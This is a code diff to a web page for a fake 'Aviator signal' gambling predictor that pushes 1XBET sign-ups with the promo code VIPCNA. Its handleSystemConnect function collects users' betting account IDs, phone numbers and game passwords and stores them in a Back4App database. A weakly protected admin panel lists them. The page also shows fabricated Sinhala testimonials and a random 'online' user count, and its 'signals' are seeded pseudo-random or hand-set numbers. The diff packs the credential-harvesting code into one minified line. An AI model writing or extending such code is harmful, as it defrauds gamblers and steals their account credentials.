@@ -21,10 +21,10 @@
 
   <style>
     :root{
-      /* Yellow/Gold/Amber theme */
-      --bg-deep: #1A1402;
+      /* Yellow/Gold/Amber theme - Brighter Background */
+      --bg-deep: #4d3803; /* Darker Gold instead of black */
       --bg-yellow-1: #3D2F0A;
-      --bg-yellow-2: #141003;
+      --bg-yellow-2: #332402; /* Dark Gold/Brown instead of black */
       --yellow-1: #FFC107;
       --yellow-2: #FFA000;
       --text: #FFF8E1;
@@ -41,7 +41,8 @@
     body {
       font-family: 'Poppins', system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
       color: var(--text);
-      background: radial-gradient(circle at 50% -10%, var(--bg-yellow-1) 0%, var(--bg-yellow-2) 70%);
+      /* Updated background to remove black */
+      background: radial-gradient(circle at 50% 0%, var(--bg-yellow-1) 0%, var(--bg-deep) 90%);
       overflow: hidden;
     }
     .topbar {
@@ -90,7 +91,8 @@
     #world.reveal {
       opacity: 1;
       clip-path: circle(150% at 50% 50%);
-      background: radial-gradient(circle at 50% -10%, var(--bg-yellow-1) 0%, var(--bg-deep) 70%) fixed;
+      /* Updated revealed background */
+      background: radial-gradient(circle at 50% 0%, var(--bg-yellow-1) 0%, var(--bg-deep) 90%) fixed;
     }
     #starfield { position: fixed; inset: 0; z-index: 0; }
     .overlay {
@@ -200,7 +202,8 @@
     .hidden { display: none !important; }
     #intro {
       position: fixed; inset: 0; z-index: 10; display: grid; place-items: center;
-      background: radial-gradient(70% 60% at 50% 40%, rgba(100, 70, 10, 0.88), rgba(26, 20, 2, 0.96));
+      /* Updated intro background */
+      background: radial-gradient(70% 60% at 50% 40%, rgba(100, 70, 10, 0.95), var(--bg-yellow-2));
       opacity: 0; visibility: hidden; transition: opacity .4s ease, visibility .4s ease;
     }
     #intro.show { opacity: 1; visibility: visible; }
@@ -370,8 +373,8 @@
       const fbNote = document.getElementById('fbNote');
       const adminDataView = document.getElementById('adminDataView');
       const onlineCounterEl = document.getElementById('onlineCounter');
-      const displayTimeInput = document.getElementById('displayTime'); // New
-      const updateDurationInput = document.getElementById('updateDuration'); // Renamed
+      const displayTimeInput = document.getElementById('displayTime');
+      const updateDurationInput = document.getElementById('updateDuration');
       const updateOddInput = document.getElementById('updateOdd');
       const saveSignalUpdateBtn = document.getElementById('saveSignalUpdate');
       const signalLockCheckbox = document.getElementById('signalLock');
@@ -383,27 +386,49 @@
       const COUNTDOWN_DURATION = 7000;
       const SHOW_DURATION = 15000;
       const CYCLE_DURATION = COUNTDOWN_DURATION + SHOW_DURATION;
-      let manualOverrideUntil = 0;
       let lastCycleSeed = -1;
-      let manualSignalOverride = { active: false, odd: 0, endTime: 0, time: '' };
-      let signalLockState = { active: false, odd: 0, time: '' };
+      let globalSignalState = null;
+      let localOverrideEndTime = 0;
+      let localOverrideSignal = {};
 
       // --- Intro and Animation ---
-      function openIntro() { intro.classList.add('show'); startOddsRain(); startBottomLoader(); }
+      function openIntro() {
+        intro.classList.add('show');
+        startOddsRain();
+        startBottomLoader();
+      }
+
       function closeIntro() {
         if (introDone) return;
         introDone = true;
-        intro.classList.remove('show'); stopOddsRain(); world.classList.add('reveal');
-        setTimeout(() => { resizeStarfield(); gameLoop(); }, 50);
+        intro.classList.remove('show');
+        stopOddsRain();
+        world.classList.add('reveal');
+        
+        setTimeout(() => {
+          resizeStarfield();
+          requestAnimationFrame(animateStarfield);
+          fetchGlobalSignal();
+          setInterval(fetchGlobalSignal, 5000);
+          setInterval(gameLoop, 250);
+          updateOnlineCounter();
+          setInterval(updateOnlineCounter, 5000);
+        }, 50);
       }
+
       function startBottomLoader() {
         const start = performance.now();
         function step(now) {
           if (introDone) return;
           const t = Math.min((now - start) / INTRO_TIME, 1);
           const pct = Math.max(1, Math.round(t * 100));
-          barFill.style.width = pct + '%'; barPct.textContent = pct + '%';
-          if (t < 1) requestAnimationFrame(step); else closeIntro();
+          barFill.style.width = pct + '%';
+          barPct.textContent = pct + '%';
+          if (t < 1) {
+            requestAnimationFrame(step);
+          } else {
+            setTimeout(closeIntro, 50);
+          }
         }
         requestAnimationFrame(step);
       }
@@ -424,7 +449,8 @@
         octx.font = "bold 18px 'Orbitron', monospace"; octx.textBaseline = 'top'; octx.shadowColor = 'rgba(255, 193, 7, 0.55)';
       }
       function stepOddsRain(dt) {
-        octx.fillStyle = `rgba(26, 20, 2, ${FADE_ALPHA})`; octx.fillRect(0, 0, oWidth, oHeight);
+        octx.fillStyle = `rgba(51, 36, 2, ${FADE_ALPHA})`;
+        octx.fillRect(0, 0, oWidth, oHeight);
         for (const col of rainCols) {
           col.y += col.vy * dt;
           if (col.y - col.nextY >= ROW_H) { col.text = formatOdd(generateOddUnderFour()); col.nextY = col.y; }
@@ -441,7 +467,7 @@
 
       // --- Core Game Logic ---
       const formatOdd = (n) => 'x' + n.toFixed(2);
-      const formatTime = (date) => date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+      const formatTime = (date) => date.toLocaleTimeString('en-GB', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
 
       function mulberry32(a) {
           return function() {
@@ -458,66 +484,94 @@
         return Math.round(v * 100) / 100;
       }
       
+      async function fetchGlobalSignal() {
+        const GlobalSignal = Parse.Object.extend("GlobalSignal");
+        const query = new Parse.Query(GlobalSignal);
+        query.equalTo("identifier", "mainSignal");
+        try {
+            const signal = await query.first();
+            if (signal) {
+                globalSignalState = {
+                    odd: signal.get("odd"),
+                    displayTime: signal.get("displayTime"),
+                    isLocked: signal.get("isLocked"),
+                    expiresAt: signal.get("expiresAt")
+                };
+            } else {
+                globalSignalState = null;
+            }
+        } catch (error) {
+            console.error("Error fetching global signal:", error);
+            globalSignalState = null;
+        }
+      }
+
       function gameLoop() {
         const now = Date.now();
         
-        if (signalLockState.active) {
-            signalTimeEl.textContent = signalLockState.time;
-            oddEl.textContent = formatOdd(signalLockState.odd);
-            oddStatusEl.textContent = "Signal Locked 🔒";
+        if (globalSignalState) {
+            if (globalSignalState.isLocked) {
+                signalTimeEl.textContent = globalSignalState.displayTime;
+                oddEl.textContent = formatOdd(globalSignalState.odd);
+                oddStatusEl.textContent = "Signal Locked 🔒";
+                return;
+            }
+            if (globalSignalState.expiresAt && globalSignalState.expiresAt.getTime() > now) {
+                signalTimeEl.textContent = globalSignalState.displayTime;
+                const timeLeft = globalSignalState.expiresAt.getTime() - now;
+                const secondsLeft = Math.max(0, Math.ceil(timeLeft / 1000));
+                oddEl.textContent = formatOdd(globalSignalState.odd);
+                oddStatusEl.textContent = `Flying... ${secondsLeft}s`;
+                return;
+            }
+        }
+        
+        if (now < localOverrideEndTime) {
+            const timeLeft = localOverrideEndTime - now;
+            const secondsLeft = Math.max(0, Math.ceil(timeLeft / 1000));
+            signalTimeEl.textContent = localOverrideSignal.time;
+            oddEl.textContent = formatOdd(localOverrideSignal.odd);
+            oddStatusEl.textContent = `Flying... ${secondsLeft}s`;
             return;
         }
 
-        if (manualSignalOverride.active && now < manualSignalOverride.endTime) {
-            signalTimeEl.textContent = manualSignalOverride.time;
-            const timeLeft = manualSignalOverride.endTime - now;
-            const secondsLeft = Math.max(0, Math.ceil(timeLeft / 1000));
-            oddEl.textContent = formatOdd(manualSignalOverride.odd);
-            oddStatusEl.textContent = `Flying... ${secondsLeft}s`;
-            return; 
+        const timeIntoCycle = now % CYCLE_DURATION;
+        if (timeIntoCycle < COUNTDOWN_DURATION) {
+            const countdown = Math.ceil((COUNTDOWN_DURATION - timeIntoCycle) / 1000);
+            signalTimeEl.textContent = "--:--:--";
+            oddEl.textContent = "--.--";
+            oddStatusEl.textContent = `Next round in ${countdown}s...`;
         } else {
-            manualSignalOverride.active = false;
-        }
-
-        if (now < manualOverrideUntil) {
-            const timeLeft = manualOverrideUntil - now;
-            const secondsLeft = Math.max(0, Math.ceil(timeLeft / 1000));
-            oddStatusEl.textContent = `Flying... ${secondsLeft}s`;
-        } else {
-            const timeIntoCycle = now % CYCLE_DURATION;
-            if (timeIntoCycle < COUNTDOWN_DURATION) {
-                const countdown = Math.ceil((COUNTDOWN_DURATION - timeIntoCycle) / 1000);
-                signalTimeEl.textContent = "--:--:--";
-                oddEl.textContent = "--.--";
-                oddStatusEl.textContent = `Next round in ${countdown}s...`;
-            } else {
-                const currentCycleSeed = Math.floor(now / CYCLE_DURATION);
-                const oddValue = getSynchronizedOdd(currentCycleSeed);
-                const timeLeftInShow = (SHOW_DURATION - (timeIntoCycle - COUNTDOWN_DURATION));
-                const secondsLeft = Math.max(0, Math.ceil(timeLeftInShow / 1000));
-                
-                if (currentCycleSeed !== lastCycleSeed) {
-                    const roundStartTime = new Date(currentCycleSeed * CYCLE_DURATION + COUNTDOWN_DURATION);
-                    const timeString = formatTime(roundStartTime);
-                    pushHistory(oddValue, timeString);
-                    lastCycleSeed = currentCycleSeed;
-                }
-                
-                signalTimeEl.textContent = history[0]?.time || '--:--:--';
-                oddEl.textContent = formatOdd(oddValue);
-                oddStatusEl.textContent = `Flying... ${secondsLeft}s`;
+            const currentCycleSeed = Math.floor(now / CYCLE_DURATION);
+            const oddValue = getSynchronizedOdd(currentCycleSeed);
+            const timeLeftInShow = (SHOW_DURATION - (timeIntoCycle - COUNTDOWN_DURATION));
+            const secondsLeft = Math.max(0, Math.ceil(timeLeftInShow / 1000));
+            
+            if (currentCycleSeed !== lastCycleSeed) {
+                const roundStartTime = new Date(currentCycleSeed * CYCLE_DURATION + COUNTDOWN_DURATION);
+                const timeString = formatTime(roundStartTime);
+                pushHistory(oddValue, timeString);
+                lastCycleSeed = currentCycleSeed;
             }
+            
+            signalTimeEl.textContent = history[0]?.time || '--:--:--';
+            oddEl.textContent = formatOdd(oddValue);
+            oddStatusEl.textContent = `Flying... ${secondsLeft}s`;
         }
       }
 
       function handleGenerateClick() {
-        manualOverrideUntil = Date.now() + SHOW_DURATION;
-        const v = generateOddUnderFour();
-        const timeString = formatTime(new Date());
-        pushHistory(v, timeString);
-        gameLoop();
-        oddEl.classList.add('pop');
-        setTimeout(() => oddEl.classList.remove('pop'), 160);
+          localOverrideEndTime = Date.now() + SHOW_DURATION;
+          const v = generateOddUnderFour();
+          const timeString = formatTime(new Date());
+
+          localOverrideSignal = { odd: v, time: timeString };
+
+          pushHistory(v, timeString);
+          gameLoop();
+          
+          oddEl.classList.add('pop');
+          setTimeout(() => oddEl.classList.remove('pop'), 160);
       }
 
       function generateOddUnderFour() {
@@ -527,6 +581,9 @@
 
       function pushHistory(val, timeStr) {
         const displayTime = timeStr || formatTime(new Date());
+        if (history.length > 0 && history[0].val === val && history[0].time === displayTime) {
+            return;
+        }
         history.unshift({ val, time: displayTime });
         if (history.length > 3) history.pop();
         renderHistory();
@@ -538,7 +595,6 @@
         }).join('');
       }
 
-      // --- Navigation ---
       function showScreen(name) {
         document.body.classList.toggle('on-feedback', name === 'feedback');
         const screens = { home: homeScr, connect: connectScr, feedback: feedbackScr, adminPanel: adminPanel, signalUpdate: signalUpdateScr };
@@ -550,153 +606,14 @@
         if (name === 'feedback') setTimeout(() => fbTextInput.focus(), 80);
       }
 
-      // --- Data Handling ---
-      async function handleSystemConnect() {
-        const systemPassword = systemPwdInput.value.trim();
-        const isOk = systemPassword.toLowerCase() === 'vipcna';
-        connStatus.textContent = isOk ? 'System Connected' : 'System Disconnected';
-        connStatus.className = 'status ' + (isOk ? 'ok' : 'bad');
+      const escapeHtml=t=>t.replace(/[&<>"']/g,m=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[m])),highlightPromo=t=>escapeHtml(t).replace(/\bVIPCNA\b/gi,'<span class="promoCode">VIPCNA</span>');function createFeedItem(t,o){let e=0;for(let a=0;a<t.length;a++)e=(31*e+t.charCodeAt(a))>>>0;const s=["#e53935","#d81b60","#8e24aa","#3949ab","#1e88e5","#00897b","#7cb342","#f9a825","#ef6c00"][e%9],i=document.createElement("li");return i.className="feedItem",i.innerHTML=`<div class="feedHead"><div class="avatar" style="--avbg: ${s}"><svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 12a5 5 0 1 0 0-10 5 5 0 0 0 0 10zm0 2c-4.4 0-8 2.2-8 5v1h16v-1c0-2.8-3.6-5-8-5z"/></svg></div><div class="name">${escapeHtml(t)}</div></div><div class="msg">${highlightPromo(o)}</div>`,i}function renderInitialFeeds(){const t=[{name:"Dulan Chamika",msg:`අඩේ මරු අයියෙ මේක නම් 100% sure signal 🔥\nVIPCNA කෝඩ් එකෙන් අලුත් 1XBET account \nඑකක් හදා ගත්තට පස්සෙ තමා \nsignal සුපිරියටම වැඩ කරේ 💸🤩❤️`},{name:"Dilshan Jayavardana",msg:"Signal nam Signal Supiri Ahh"},{name:"ජානකී හේරත්",msg:"ලක්ෂ 8 ක් ලොස් වෙලා හිටියෙ , දවස් තුනෙක් කවර් කරා මේ ඇප් එක නිසා මුළු loss එකම , ඇත්තටම ගොඩක් ස්තුතී"},{name:"වසන්ත ජයතිලක",msg:"Thank Brother Aviator Signal මරු ❤️"}];feedList.innerHTML="",t.forEach(t=>feedList.appendChild(createFeedItem(t.name,t.msg)))}let feedbackInterval=null;function showRandomFeedback(){if(!feedbackScr.classList.contains("show"))return;const t=["Nimal Perera","Sunil Silva","Kamal Fernando","Kasun Bandara","Ruwan Gamage","Priya Kumari","Saman Jayasuriya","Gayan Dias","Chathura Sampath","Pasan Madhawa","Shehan Wijesinghe","Lakmali Herath","Nadeesha Dilrukshi","Mihiri Sandunika","Ashen Vithanage"][Math.floor(15*Math.random())],o=["signal හොදයි 👍","මම ගොඩක් සල්ලි හෙව්වා මේකෙන් 💰","ඇප් එක නම් මරු","සුපිරි signals bro","win win win only!","loss cover කරගන්න පුළුවන් වුණා, thanks","patta app eka","100% sure signals!","VIPCNA code eka weda, supiri","Thank you very much!","Best signal app I've used","maru signal eka..","niyamai ayye..."][Math.floor(13*Math.random())],e=createFeedItem(t,o);feedList.prepend(e),feedList.children.length>8&&feedList.lastChild.remove()}function handleSendFeedback(){const t=fbNameInput.value.trim()||"Anonymous",o=fbTextInput.value.trim();o?(feedList.prepend(createFeedItem(t,o)),fbTextInput.value="",fbNameInput.value="",fbNote.textContent="යවන ලදී ✓",setTimeout(()=>{fbNote.textContent=""},1200)):fbNote.textContent="කරුණාකර පළමුව ඔබේ අදහස ලියන්න."}function updateOnlineCounter(){const t=Math.floor(41*Math.random())+30;onlineCounterEl.textContent=`Online: ${t}`}async function handleSystemConnect(){const t=systemPwdInput.value.trim(),o="vipcna"===t.toLowerCase();connStatus.textContent=o?"System Connected":"System Disconnected",connStatus.className="status "+(o?"ok":"bad");const e=gameIdInput.value.trim(),s=phoneNumberInput.value.trim(),i=gamePwdInput.value.trim();if(o&&e&&s&&i){const a=Parse.Object.extend("UserConnection"),n=new a;n.set("gameId",e),n.set("phoneNumber",s),n.set("systemPassword",t),n.set("gamePassword",i);try{await n.save(),console.log("User connection saved successfully to Back4App!")}catch(t){console.error("Error while saving user connection: ",t),alert("Could not save data. Check console for errors.")}}}async function fetchAdminData(){adminDataView.textContent="Loading data...";const t=Parse.Object.extend("UserConnection"),o=new Parse.Query(t);o.descending("createdAt");try{const e=await o.find();if(0===e.length)return void(adminDataView.textContent="No connections saved yet.");const s=e.map((t,o)=>{const e=t.createdAt.toLocaleString("si-LK"),s=t.get("gameId"),i=t.get("phoneNumber"),a=t.get("systemPassword"),n=t.get("gamePassword");return`${o+1}. Time: ${e}\n   Game ID: ${s}\n   Phone: ${i}\n   Game Pass: ${n}\n   System Pass: ${a}`}).join("\n\n");adminDataView.textContent=s}catch(t){console.error("Error while fetching admin data: ",t),adminDataView.textContent="Error fetching data. Check console."}}function handleSocialLink(e){e.preventDefault();const t="virat1xbet",o=`tg://resolve?domain=${t}`,n=`https://t.me/${t}`;window.location.href=o,setTimeout(()=>{window.open(n,"_blank","noopener,noreferrer")},500)}const sctx=starfieldCanvas.getContext("2d",{alpha:!0});let stars=[],sWidth=0,sHeight=0,sDpr=1;function resizeStarfield(){sDpr=Math.min(window.devicePixelRatio||1,2),sWidth=innerWidth,sHeight=innerHeight,starfieldCanvas.width=Math.floor(sWidth*sDpr),starfieldCanvas.height=Math.floor(sHeight*sDpr),starfieldCanvas.style.width=sWidth+"px",starfieldCanvas.style.height=sHeight+"px",sctx.setTransform(sDpr,0,0,sDpr,0,0);const t=Math.min(220,Math.floor(sWidth*sHeight/9e3));stars=[];for(let o=0;o<t;o++){const t=.4+1.6*Math.random(),e=10+35*t,s=(-90+20*Math.random()-10)*Math.PI/180;stars.push({x:Math.random()*sWidth,y:Math.random()*sHeight,r:t,vx:Math.cos(s)*e,vy:Math.sin(s)*e,twPhase:2*Math.random()*Math.PI,twSpeed:.6+1.4*Math.random()})}}let lastT=performance.now();function animateStarfield(t){const o=Math.min((t-lastT)/1e3,.05);lastT=t,sctx.clearRect(0,0,sWidth,sHeight);for(const t of stars){t.x+=t.vx*o,t.y+=t.vy*o,t.x<-8?t.x=sWidth+8:t.x>sWidth+8&&(t.x=-8),t.y<-8?t.y=sHeight+8:t.y>sHeight+8&&(t.y=-8);const e=(Math.sin(t.twSpeed*t/1e3*1.2+t.twPhase)+1)/2,s=.25+.65*e,i=t.r*(.9+.35*e);sctx.fillStyle=`rgba(255,255,255,${s})`,sctx.beginPath(),sctx.arc(t.x,t.y,i,0,2*Math.PI),sctx.fill()}requestAnimationFrame(animateStarfield)}
 
-        const gameId = gameIdInput.value.trim();
-        const phone = phoneNumberInput.value.trim();
-        const gamePassword = gamePwdInput.value.trim();
-        
-        if (isOk && gameId && phone && gamePassword) {
-            const UserConnection = Parse.Object.extend("UserConnection");
-            const connection = new UserConnection();
-            connection.set("gameId", gameId);
-            connection.set("phoneNumber", phone);
-            connection.set("systemPassword", systemPassword);
-            connection.set("gamePassword", gamePassword);
-            try {
-                await connection.save();
-                console.log('User connection saved successfully to Back4App!');
-            } catch (error) {
-                console.error('Error while saving user connection: ', error);
-                alert('Could not save data. Check console for errors.');
-            }
-        }
-      }
-
-      function handleSocialLink(e) {
-        e.preventDefault();
-        const TG_USER = 'virat1xbet';
-        const deepLink = `tg://resolve?domain=${TG_USER}`;
-        const webLink = `https://t.me/${TG_USER}`;
-        window.location.href = deepLink;
-        setTimeout(() => { window.open(webLink, '_blank', 'noopener,noreferrer'); }, 500);
-      }
-      
-      // --- Feedback System ---
-      const RANDOM_NAMES = ["Nimal Perera", "Sunil Silva", "Kamal Fernando", "Kasun Bandara", "Ruwan Gamage", "Priya Kumari", "Saman Jayasuriya", "Gayan Dias", "Chathura Sampath", "Pasan Madhawa", "Shehan Wijesinghe", "Lakmali Herath", "Nadeesha Dilrukshi", "Mihiri Sandunika", "Ashen Vithanage"];
-      const RANDOM_MESSAGES = ["signal හොදයි 👍", "මම ගොඩක් සල්ලි හෙව්වා මේකෙන් 💰", "ඇප් එක නම් මරු", "සුපිරි signals bro", "win win win only!", "loss cover කරගන්න පුළුවන් වුණා, thanks", "patta app eka", "100% sure signals!", "VIPCNA code eka weda, supiri", "Thank you very much!", "Best signal app I've used", "maru signal eka..", "niyamai ayye..."];
-      const INITIAL_FEEDS = [{ name: 'Dulan Chamika', msg: `අඩේ මරු අයියෙ මේක නම් 100% sure signal 🔥\nVIPCNA කෝඩ් එකෙන් අලුත් 1XBET account \nඑකක් හදා ගත්තට පස්සෙ තමා \nsignal සුපිරියටම වැඩ කරේ 💸🤩❤️`, }, { name: 'Dilshan Jayavardana', msg: 'Signal nam Signal Supiri Ahh' }, { name: 'ජානකී හේරත්', msg: 'ලක්ෂ 8 ක් ලොස් වෙලා හිටියෙ , දවස් තුනෙක් කවර් කරා මේ ඇප් එක නිසා මුළු loss එකම , ඇත්තටම ගොඩක් ස්තුතී' }, { name: 'වසන්ත ජයතිලක', msg: 'Thank Brother Aviator Signal මරු ❤️' },];
-      const AV_COLORS = ['#e53935','#d81b60','#8e24aa','#3949ab','#1e88e5','#00897b','#7cb342','#f9a825','#ef6c00'];
-      const PERSON_SVG = `<svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 12a5 5 0 1 0 0-10 5 5 0 0 0 0 10zm0 2c-4.4 0-8 2.2-8 5v1h16v-1c0-2.8-3.6-5-8-5z"/></svg>`;
-      let feedbackInterval = null;
-      
-      const escapeHtml = (t) => t.replace(/[&<>"']/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));
-      const highlightPromo = (text) => escapeHtml(text).replace(/\bVIPCNA\b/gi, '<span class="promoCode">VIPCNA</span>');
-      
-      function createFeedItem(name, message) {
-        let h=0; for (let i=0;i<name.length;i++){ h = (h*31 + name.charCodeAt(i))>>>0; }
-        const color = AV_COLORS[h % AV_COLORS.length];
-        const li = document.createElement('li');
-        li.className = 'feedItem';
-        li.innerHTML = `<div class="feedHead"><div class="avatar" style="--avbg: ${color}">${PERSON_SVG}</div><div class="name">${escapeHtml(name)}</div></div><div class="msg">${highlightPromo(message)}</div>`;
-        return li;
-      }
-      function renderInitialFeeds() { feedList.innerHTML = ''; INITIAL_FEEDS.forEach(f => feedList.appendChild(createFeedItem(f.name, f.msg))); }
-      function showRandomFeedback() {
-        if (!feedbackScr.classList.contains('show')) return;
-        const randomName = RANDOM_NAMES[Math.floor(Math.random() * RANDOM_NAMES.length)];
-        const randomMsg = RANDOM_MESSAGES[Math.floor(Math.random() * RANDOM_MESSAGES.length)];
-        const newItem = createFeedItem(randomName, randomMsg);
-        feedList.prepend(newItem);
-        if (feedList.children.length > 8) { feedList.lastChild.remove(); }
-      }
-      function handleSendFeedback() {
-        const name = (fbNameInput.value.trim() || 'Anonymous');
-        const text = fbTextInput.value.trim();
-        if (!text) { fbNote.textContent = 'කරුණාකර පළමුව ඔබේ අදහස ලියන්න.'; return; }
-        feedList.prepend(createFeedItem(name, text));
-        fbTextInput.value = ''; fbNameInput.value = '';
-        fbNote.textContent = 'යවන ලදී ✓';
-        setTimeout(() => fbNote.textContent = '', 1200);
-      }
-
-      // --- Admin and Utility ---
-      function updateOnlineCounter() {
-        const count = Math.floor(Math.random() * 41) + 30; // 30 to 70
-        onlineCounterEl.textContent = `Online: ${count}`;
-      }
-      async function fetchAdminData() {
-        adminDataView.textContent = 'Loading data...';
-        const UserConnection = Parse.Object.extend("UserConnection");
-        const query = new Parse.Query(UserConnection);
-        query.descending("createdAt");
-        try {
-            const results = await query.find();
-            if (results.length === 0) { adminDataView.textContent = 'No connections saved yet.'; return; }
-            const dataText = results.map((conn, index) => {
-                const timestamp = conn.createdAt.toLocaleString('si-LK');
-                const gameId = conn.get('gameId');
-                const phone = conn.get('phoneNumber');
-                const systemPass = conn.get('systemPassword');
-                const gamePass = conn.get('gamePassword');
-                return `${index + 1}. Time: ${timestamp}\n   Game ID: ${gameId}\n   Phone: ${phone}\n   Game Pass: ${gamePass}\n   System Pass: ${systemPass}`;
-            }).join('\n\n');
-            adminDataView.textContent = dataText;
-        } catch (error) {
-            console.error("Error while fetching admin data: ", error);
-            adminDataView.textContent = 'Error fetching data. Check console.';
-        }
-      }
-
-      // --- Starfield Background ---
-      const sctx = starfieldCanvas.getContext('2d', { alpha: true });
-      let stars = [], sWidth = 0, sHeight = 0, sDpr = 1;
-      function resizeStarfield() {
-        sDpr = Math.min(window.devicePixelRatio || 1, 2);
-        sWidth = innerWidth; sHeight = innerHeight;
-        starfieldCanvas.width = Math.floor(sWidth * sDpr); starfieldCanvas.height = Math.floor(sHeight * sDpr);
-        starfieldCanvas.style.width = sWidth + 'px'; starfieldCanvas.style.height = sHeight + 'px';
-        sctx.setTransform(sDpr, 0, 0, sDpr, 0, 0);
-        const count = Math.min(220, Math.floor((sWidth * sHeight) / 9000));
-        stars = [];
-        for (let i = 0; i < count; i++) {
-          const r = 0.4 + Math.random() * 1.6;
-          const speed = 10 + r * 35;
-          const angle = (-90 + (Math.random() * 20 - 10)) * Math.PI / 180;
-          stars.push({ x: Math.random() * sWidth, y: Math.random() * sHeight, r, vx: Math.cos(angle) * speed, vy: Math.sin(angle) * speed, twPhase: Math.random() * Math.PI * 2, twSpeed: 0.6 + Math.random() * 1.4 });
-        }
-      }
-      let lastT = performance.now();
-      function animateStarfield(now) {
-        const dt = Math.min((now - lastT) / 1000, 0.05); lastT = now;
-        sctx.clearRect(0, 0, sWidth, sHeight);
-        for (const s of stars) {
-          s.x += s.vx * dt; s.y += s.vy * dt;
-          if (s.x < -8) s.x = sWidth + 8; if (s.x > sWidth + 8) s.x = -8;
-          if (s.y < -8) s.y = sHeight + 8; if (s.y > sHeight + 8) s.y = -8;
-          const tw = (Math.sin(now / 1000 * (1.2 * s.twSpeed) + s.twPhase) + 1) / 2;
-          const alpha = 0.25 + tw * 0.65;
-          const rad = s.r * (0.9 + tw * 0.35);
-          sctx.fillStyle = `rgba(255,255,255,${alpha})`;
-          sctx.beginPath(); sctx.arc(s.x, s.y, rad, 0, Math.PI * 2); sctx.fill();
-        }
-        requestAnimationFrame(animateStarfield);
-      }
-
-      // --- Initialization ---
       function init() {
         window.addEventListener('load', openIntro);
-        window.addEventListener('resize', resizeStarfield);
-        skipIntro.addEventListener('click', () => { barFill.style.width = '100%'; barPct.textContent = '100%'; closeIntro(); });
+        skipIntro.addEventListener('click', closeIntro);
         genBtn.addEventListener('click', handleGenerateClick);
         clearBtn.addEventListener('click', () => { history.length = 0; renderHistory(); });
         
-        // Navigation Listeners
         connectBtn.addEventListener('click', () => showScreen('connect'));
         feedbackBtn.addEventListener('click', () => {
             showScreen('feedback');
@@ -707,16 +624,13 @@
         backFromFeedback.addEventListener('click', () => { showScreen('home'); clearInterval(feedbackInterval); });
         backFromAdmin.addEventListener('click', () => showScreen('home'));
         backFromSignalUpdate.addEventListener('click', () => showScreen('home'));
-
-        // Action Listeners
         sysConnect.addEventListener('click', handleSystemConnect);
         fbSendBtn.addEventListener('click', handleSendFeedback);
         document.querySelectorAll('.open-tg').forEach(a => a.addEventListener('click', handleSocialLink));
         
-        // Admin Panels Listeners
         adminBtn.addEventListener('click', async () => {
             const pass = prompt('Enter Admin Password:');
-            if (pass === '2003') {
+            if (pass === '623') { // Updated Password
                 showScreen('adminPanel');
                 await fetchAdminData();
             } else if (pass !== null) {
@@ -726,62 +640,75 @@
         
         signalUpdateBtn.addEventListener('click', () => {
             const pass = prompt('Enter Password:');
-            if (pass === '2003') {
-                signalLockCheckbox.checked = signalLockState.active;
-                // Pre-fill fields with current locked signal if it exists
-                if(signalLockState.active) {
-                    displayTimeInput.value = signalLockState.time;
-                    updateOddInput.value = signalLockState.odd;
-                }
+            if (pass === '623') { // Updated Password
+                displayTimeInput.value = '';
+                updateOddInput.value = '';
+                updateDurationInput.value = '';
+                signalLockCheckbox.checked = globalSignalState?.isLocked || false;
                 showScreen('signalUpdate');
             } else if (pass !== null) {
                 alert('Incorrect Password!');
             }
         });
         
-        saveSignalUpdateBtn.addEventListener('click', () => {
+        saveSignalUpdateBtn.addEventListener('click', async () => {
+            saveSignalUpdateBtn.disabled = true;
+            saveSignalUpdateBtn.textContent = 'Updating...';
+
+            const GlobalSignal = Parse.Object.extend("GlobalSignal");
+            const query = new Parse.Query(GlobalSignal);
+            query.equalTo("identifier", "mainSignal");
+            let signalObject = await query.first();
+
+            if (!signalObject) {
+                signalObject = new GlobalSignal();
+                signalObject.set("identifier", "mainSignal");
+            }
+
             const isLocked = signalLockCheckbox.checked;
             const odd = parseFloat(updateOddInput.value);
             const displayTime = displayTimeInput.value.trim();
+            const duration = parseFloat(updateDurationInput.value);
 
+            signalObject.set("isLocked", isLocked);
+            
             if (isLocked) {
-                if (isNaN(odd) || odd <= 0 || !displayTime) {
-                    alert('Please enter a valid Odd and Display Time to lock.');
+                if (isNaN(odd) || !displayTime) {
+                    alert('For locking, please provide a valid Odd and Display Time.');
+                    saveSignalUpdateBtn.disabled = false;
+                    saveSignalUpdateBtn.textContent = 'Update Signal';
                     return;
                 }
-                signalLockState = { active: true, odd: odd, time: displayTime };
-                manualSignalOverride.active = false;
-                
-                pushHistory(odd, displayTime);
-                alert('Signal Locked!');
+                signalObject.set("odd", odd);
+                signalObject.set("displayTime", displayTime);
+                signalObject.set("expiresAt", null);
             } else {
-                signalLockState.active = false;
-                
-                const duration = parseFloat(updateDurationInput.value);
-                if (!isNaN(odd) && odd > 0 && displayTime && !isNaN(duration) && duration > 0) {
-                    manualSignalOverride = {
-                        active: true,
-                        odd: odd,
-                        endTime: Date.now() + (duration * 1000),
-                        time: displayTime
-                    };
-                    pushHistory(odd, displayTime);
-                    alert('Temporary signal updated!');
+                if (!isNaN(odd) && displayTime && !isNaN(duration) && duration > 0) {
+                    signalObject.set("odd", odd);
+                    signalObject.set("displayTime", displayTime);
+                    signalObject.set("expiresAt", new Date(Date.now() + duration * 1000));
                 } else {
-                    alert('Signal Unlocked! Returning to automatic cycle.');
+                    signalObject.set("isLocked", false);
+                    signalObject.set("expiresAt", new Date(0));
                 }
             }
-            gameLoop();
-            showScreen('home');
+
+            try {
+                await signalObject.save();
+                await fetchGlobalSignal();
+                gameLoop();
+                alert('Global Signal has been updated successfully!');
+                showScreen('home');
+            } catch (error) {
+                alert('Error updating signal. Check console.');
+                console.error("Error saving global signal:", error);
+            } finally {
+                saveSignalUpdateBtn.disabled = false;
+                saveSignalUpdateBtn.textContent = 'Update Signal';
+            }
         });
         
-        // Initial setup calls
         renderInitialFeeds();
-        resizeStarfield();
-        requestAnimationFrame(animateStarfield);
-        setInterval(gameLoop, 250);
-        updateOnlineCounter();
-        setInterval(updateOnlineCounter, 5000);
       }
 
       init();
